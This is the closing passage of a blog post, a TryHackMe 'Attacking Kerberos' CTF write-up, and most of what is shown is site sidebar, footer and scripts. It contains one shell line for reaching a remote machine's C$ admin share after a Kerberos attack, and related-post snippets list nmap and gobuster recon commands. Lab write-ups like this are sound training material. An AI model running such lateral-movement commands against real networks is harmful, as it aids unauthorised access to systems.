</pre></table></code></div></div><p>to access directories you could use a command similar to:</p><div class="language-shell highlighter-rouge"><div class="code-header"> <span data-label-text="Shell"><i class="fas fa-code small"></i></span> <button aria-label="copy" data-title-succeed="Copied!"><i class="far fa-clipboard"></i></button></div><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
</pre><td class="rouge-code"><pre><span class="nb">dir</span> <span class="se">\\</span>Desktop-1<span class="se">\c</span><span class="nv">$ </span>/user:Machine1 mimikatz
</pre></table></code></div></div><h2 id="conclusion"><span class="mr-2">Conclusion</span><a href="#conclusion" class="anchor text-muted"><i class="fas fa-hashtag"></i></a></h2><hr /><p>And we are done! Over all I enjoyed this room and it was amazingly informative in these basic techniques on attacking kerberos. Thank you for reading!</p></div><div class="post-tail-wrapper text-muted"><div class="post-meta mb-3"> <i class="far fa-folder-open fa-fw mr-1"></i> <a href='/categories/tryhackme/'>tryhackme</a>, <a href='/categories/ctf/'>ctf</a></div><div class="post-tags"> <i class="fa fa-tags fa-fw mr-1"></i> <a href="/tags/writeup/" class="post-tag no-text-decoration" >writeup</a> <a href="/tags/hacking/" class="post-tag no-text-decoration" >hacking</a> <a href="/tags/active-directory/" class="post-tag no-text-decoration" >active-directory</a></div><div class="post-tail-bottom d-flex justify-content-between align-items-center mt-3 pt-5 pb-2"><div class="license-wrapper"> This post is licensed under <a href="https://creativecommons.org/licenses/by/4.0/"> CC BY 4.0 </a> by the author.</div><div class="share-wrapper"> <span class="share-label text-muted mr-1">Share</span> <span class="share-icons"> <a href="https://twitter.com/intent/tweet?text=THM+Attacking+Kerberos+Writeup+-+Brian+Biddle&url=https%3A%2F%2Ffaecomputing.com%2Fposts%2Fattacking-kerberos%2F" data-toggle="tooltip" data-placement="top" title="Twitter" target="_blank" rel="noopener" aria-label="Twitter"> <i class="fa-fw fab fa-twitter"></i> </a> <a href="https://www.facebook.com/sharer/sharer.php?title=THM+Attacking+Kerberos+Writeup+-+Brian+Biddle&u=https%3A%2F%2Ffaecomputing.com%2Fposts%2Fattacking-kerberos%2F" data-toggle="tooltip" data-placement="top" title="Facebook" target="_blank" rel="noopener" aria-label="Facebook"> <i class="fa-fw fab fa-facebook-square"></i> </a> <a href="https://t.me/share/url?url=https%3A%2F%2Ffaecomputing.com%2Fposts%2Fattacking-kerberos%2F&text=THM+Attacking+Kerberos+Writeup+-+Brian+Biddle" data-toggle="tooltip" data-placement="top" title="Telegram" target="_blank" rel="noopener" aria-label="Telegram"> <i class="fa-fw fab fa-telegram"></i> </a> <a href="https://www.linkedin.com/sharing/share-offsite/?url=https%3A%2F%2Ffaecomputing.com%2Fposts%2Fattacking-kerberos%2F" data-toggle="tooltip" data-placement="top" title="Linkedin" target="_blank" rel="noopener" aria-label="Linkedin"> <i class="fa-fw fab fa-linkedin"></i> </a> <i id="copy-link" class="fa-fw fas fa-link small" data-toggle="tooltip" data-placement="top" title="Copy link" data-title-succeed="Link copied successfully!"> </i> </span></div></div></div></div></div><div id="panel-wrapper" class="col-xl-3 pl-2 text-muted"><div class="access"><div id="access-lastmod" class="post"><div class="panel-heading">Recently Updated</div><ul class="post-content pl-0 pb-1 ml-1 mt-2"><li><a href="/posts/ansible/">Getting Started with Ansible</a><li><a href="/posts/thm-red-team-fundamentals-overview/">THM Red Team Fundamentals Overview</a><li><a href="/posts/zero-trust/">Implementing Zero-Trust in my Homelab</a><li><a href="/posts/momentum-2-writeup/">Vulnhub Momentum 2 Writeup</a><li><a href="/posts/burnincandle/">Burn in Candle - Traffic Analysis</a></ul></div><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/hosting/">hosting</a> <a class="post-tag" href="/tags/servers/">servers</a> <a class="post-tag" href="/tags/networking/">networking</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/blueteam/">blueteam</a> <a class="post-tag" href="/tags/docker/">docker</a></div></div></div><script src="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.js"></script><div id="toc-wrapper" class="pl-0 pr-4 mb-5"><div class="panel-heading pl-3 pt-2 mb-2">Contents</div><nav id="toc" data-toggle="toc"></nav></div></div></div><div class="row"><div id="tail-wrapper" class="col-12 col-lg-11 col-xl-9 pl-3 pr-3 pr-xl-4"><div id="related-posts" class="mt-5 mb-2 mb-sm-4"><h3 class="pt-2 mt-1 mb-4 ml-1" data-toc-skip>Further Reading</h3><div class="card-deck mb-4"><div class="card"> <a href="/posts/attacktive-directory/"><div class="card-body"> <em class="small" data-ts="1661799600" data-df="ll" > Aug 29, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>THM Attacktive Directory Writeup</h3><div class="text-muted small"><p> Attacktive Directory This is a basic active directory box on THM to learn a simple flow on attacking active directory. Follow along with the first 3 tasks to get things setup for yourself either...</p></div></div></a></div><div class="card"> <a href="/posts/vulnversity/"><div class="card-body"> <em class="small" data-ts="1653073200" data-df="ll" > May 20, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>THM Vulnversity Writeup</h3><div class="text-muted small"><p> Vulnversity write-up Task Recon use nmap to solve nmap -sV -n $IP Directory traversal use gobuster to solve gobuster dir -u http://$IP:3333 -w /path/to/wordlist Compromise web-server use b...</p></div></div></a></div><div class="card"> <a href="/posts/win-privesc/"><div class="card-body"> <em class="small" data-ts="1655751600" data-df="ll" > Jun 20, 2022 </em><h3 class="pt-0 mt-1 mb-3" data-toc-skip>THM Windows PrivEsc 2022</h3><div class="text-muted small"><p> Windows Privlage Escelation Writeup Write-up by B4ndw1d7h * First off I want to thank tryhackme and munra for the amazing ...</p></div></div></a></div></div></div><div class="post-navigation d-flex justify-content-between"> <a href="/posts/attacktive-directory/" class="btn btn-outline-primary" prompt="Older"><p>THM Attacktive Directory Writeup</p></a> <a href="/posts/thm-red-team-fundamentals-overview/" class="btn btn-outline-primary" prompt="Newer"><p>THM Red Team Fundamentals Overview</p></a></div></div></div><footer class="row pl-3 pr-3"><div class="col-12 d-flex justify-content-between align-items-center text-muted pl-0 pr-0"><div class="footer-left"><p class="mb-0"> © 2024 <a href="https://github.com/username">Brian Biddle</a>. <span data-toggle="tooltip" data-placement="top" title="Except where otherwise noted, the blog posts on this site are licensed under the Creative Commons Attribution 4.0 International (CC BY 4.0) License by the author.">Some rights reserved.</span></p></div><div class="footer-right"><p class="mb-0"> Powered by <a href="https://jekyllrb.com" target="_blank" rel="noopener">Jekyll</a> with <a href="https://github.com/cotes2020/jekyll-theme-chirpy" target="_blank" rel="noopener">Chirpy</a> theme.</p></div></div></footer></div><div id="search-result-wrapper" class="d-flex justify-content-center unloaded"><div class="col-12 col-sm-11 post-content"><div id="search-hints"><div id="access-tags"><div class="panel-heading">Trending Tags</div><div class="d-flex flex-wrap mt-3 mb-1 mr-3"> <a class="post-tag" href="/tags/hacking/">hacking</a> <a class="post-tag" href="/tags/writeup/">writeup</a> <a class="post-tag" href="/tags/linux/">linux</a> <a class="post-tag" href="/tags/web/">web</a> <a class="post-tag" href="/tags/hosting/">hosting</a> <a class="post-tag" href="/tags/servers/">servers</a> <a class="post-tag" href="/tags/networking/">networking</a> <a class="post-tag" href="/tags/active-directory/">active-directory</a> <a class="post-tag" href="/tags/blueteam/">blueteam</a> <a class="post-tag" href="/tags/docker/">docker</a></div></div></div><div id="search-results" class="d-flex flex-wrap justify-content-center text-muted mt-3"></div></div></div></div><div id="mask"></div><a id="back-to-top" href="#" aria-label="back-to-top" class="btn btn-lg btn-box-shadow" role="button"> <i class="fas fa-angle-up"></i> </a><div id="notification" class="toast" role="alert" aria-live="assertive" aria-atomic="true" data-animation="true" data-autohide="false"><div class="toast-header"> <button type="button" class="ml-2 ml-auto close" data-dismiss="toast" aria-label="Close"> <span aria-hidden="true">&times;</span> </button></div><div class="toast-body text-center pt-0"><p class="pl-2 pr-2 mb-3">A new version of content is available.</p><button type="button" class="btn btn-primary" aria-label="Update"> Update </button></div></div><script src="https://cdn.jsdelivr.net/npm/simple-jekyll-search@1.10.0/dest/simple-jekyll-search.min.js"></script> <script> SimpleJekyllSearch({ searchInput: document.getElementById('search-input'), resultsContainer: document.getElementById('search-results'), json: '/assets/js/data/search.json', searchResultTemplate: '<div class="pl-1 pr-1 pl-sm-2 pr-sm-2 pl-lg-4 pr-lg-4 pl-xl-0 pr-xl-0"> <a href="{url}">{title}</a><div class="post-meta d-flex flex-column flex-sm-row text-muted mt-1 mb-1"> {categories} {tags}</div><p>{snippet}</p></div>', noResultsText: '<p class="mt-5">Oops! No results found.</p>', templateMiddleware: function(prop, value, template) { if (prop === 'categories') { if (value === '') { return `${value}`; } else { return `<div class="mr-sm-4"><i class="far fa-folder fa-fw"></i>${value}</div>`; } } if (prop === 'tags') { if (value === '') { return `${value}`; } else { return `<div><i class="fa fa-tag fa-fw"></i>${value}</div>`; } } } }); </script> <script src="https://cdn.jsdelivr.net/combine/npm/magnific-popup@1/dist/jquery.magnific-popup.min.js,npm/lozad/dist/lozad.min.js,npm/clipboard@2/dist/clipboard.min.js"></script> <script src="https://cdn.jsdelivr.net/combine/npm/dayjs@1/dayjs.min.js,npm/dayjs@1/locale/en.min.js,npm/dayjs@1/plugin/relativeTime.min.js,npm/dayjs@1/plugin/localizedFormat.min.js"></script> <script defer src="/assets/js/dist/post.min.js"></script> <script src="https://cdn.jsdelivr.net/npm/bootstrap@4/dist/js/bootstrap.bundle.min.js"></script> <script defer src="/app.js"></script>
